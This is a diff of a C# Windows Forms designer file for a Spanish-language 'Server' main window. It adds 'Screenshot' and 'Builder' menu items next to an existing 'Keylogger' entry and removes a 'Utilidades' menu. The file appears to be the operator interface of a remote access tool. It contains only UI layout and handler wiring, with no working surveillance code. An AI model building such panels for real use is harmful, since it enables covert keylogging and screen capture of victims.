@@ -38,7 +38,6 @@ namespace Server
             menuStrip1 = new MenuStrip();
             configuraciónToolStripMenuItem = new ToolStripMenuItem();
             informaciónToolStripMenuItem = new ToolStripMenuItem();
-            utilidadesToolStripMenuItem = new ToolStripMenuItem();
             ayudaToolStripMenuItem = new ToolStripMenuItem();
             dataGridView1 = new DataGridView();
             contextMenuStrip1 = new ContextMenuStrip(components);
@@ -46,6 +45,8 @@ namespace Server
             xDToolStripMenuItem = new ToolStripMenuItem();
             keyloggerToolStripMenuItem = new ToolStripMenuItem();
             informaciónToolStripMenuItem1 = new ToolStripMenuItem();
+            screenshotToolStripMenuItem = new ToolStripMenuItem();
+            builderToolStripMenuItem = new ToolStripMenuItem();
             panel2.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
             menuStrip1.SuspendLayout();
@@ -89,7 +90,7 @@ namespace Server
             // 
             menuStrip1.BackColor = Color.SteelBlue;
             menuStrip1.Font = new Font("Segoe UI", 9F, FontStyle.Bold, GraphicsUnit.Point, 0);
-            menuStrip1.Items.AddRange(new ToolStripItem[] { configuraciónToolStripMenuItem, utilidadesToolStripMenuItem, ayudaToolStripMenuItem });
+            menuStrip1.Items.AddRange(new ToolStripItem[] { configuraciónToolStripMenuItem, ayudaToolStripMenuItem, builderToolStripMenuItem });
             menuStrip1.Location = new Point(0, 0);
             menuStrip1.Name = "menuStrip1";
             menuStrip1.Size = new Size(1194, 24);
@@ -110,12 +111,6 @@ namespace Server
             informaciónToolStripMenuItem.Size = new Size(180, 22);
             informaciónToolStripMenuItem.Text = "Servidor";
             informaciónToolStripMenuItem.Click += informaciónToolStripMenuItem_Click;
-            // 
-            // utilidadesToolStripMenuItem
-            // 
-            utilidadesToolStripMenuItem.Name = "utilidadesToolStripMenuItem";
-            utilidadesToolStripMenuItem.Size = new Size(74, 20);
-            utilidadesToolStripMenuItem.Text = "Utilidades";
             // 
             // ayudaToolStripMenuItem
             // 
@@ -152,9 +147,9 @@ namespace Server
             // 
             // contextMenuStrip1
             // 
-            contextMenuStrip1.Items.AddRange(new ToolStripItem[] { pruebaToolStripMenuItem, xDToolStripMenuItem, keyloggerToolStripMenuItem, informaciónToolStripMenuItem1 });
+            contextMenuStrip1.Items.AddRange(new ToolStripItem[] { pruebaToolStripMenuItem, xDToolStripMenuItem, keyloggerToolStripMenuItem, informaciónToolStripMenuItem1, screenshotToolStripMenuItem });
             contextMenuStrip1.Name = "contextMenuStrip1";
-            contextMenuStrip1.Size = new Size(181, 114);
+            contextMenuStrip1.Size = new Size(176, 114);
             // 
             // pruebaToolStripMenuItem
             // 
@@ -180,9 +175,24 @@ namespace Server
             // informaciónToolStripMenuItem1
             // 
             informaciónToolStripMenuItem1.Name = "informaciónToolStripMenuItem1";
-            informaciónToolStripMenuItem1.Size = new Size(180, 22);
+            informaciónToolStripMenuItem1.Size = new Size(175, 22);
             informaciónToolStripMenuItem1.Text = "Información";
             informaciónToolStripMenuItem1.Click += informaciónToolStripMenuItem1_Click;
+            // 
+            // screenshotToolStripMenuItem
+            // 
+            screenshotToolStripMenuItem.Name = "screenshotToolStripMenuItem";
+            screenshotToolStripMenuItem.Size = new Size(175, 22);
+            screenshotToolStripMenuItem.Text = "Screenshot";
+            screenshotToolStripMenuItem.Click += screenshotToolStripMenuItem_Click;
+            // 
+            // builderToolStripMenuItem
+            // 
+            builderToolStripMenuItem.Image = (Image)resources.GetObject("builderToolStripMenuItem.Image");
+            builderToolStripMenuItem.Name = "builderToolStripMenuItem";
+            builderToolStripMenuItem.Size = new Size(75, 20);
+            builderToolStripMenuItem.Text = "Builder";
+            builderToolStripMenuItem.Click += builderToolStripMenuItem_Click;
             // 
             // MainForm
             // 
@@ -221,7 +231,6 @@ namespace Server
         private MenuStrip menuStrip1;
         private ToolStripMenuItem configuraciónToolStripMenuItem;
         private ToolStripMenuItem informaciónToolStripMenuItem;
-        private ToolStripMenuItem utilidadesToolStripMenuItem;
         private ToolStripMenuItem ayudaToolStripMenuItem;
         private DataGridView dataGridView1;
         private ContextMenuStrip contextMenuStrip1;
@@ -229,5 +238,7 @@ namespace Server
         private ToolStripMenuItem xDToolStripMenuItem;
         private ToolStripMenuItem keyloggerToolStripMenuItem;
         private ToolStripMenuItem informaciónToolStripMenuItem1;
+        private ToolStripMenuItem screenshotToolStripMenuItem;
+        private ToolStripMenuItem builderToolStripMenuItem;
     }
 }
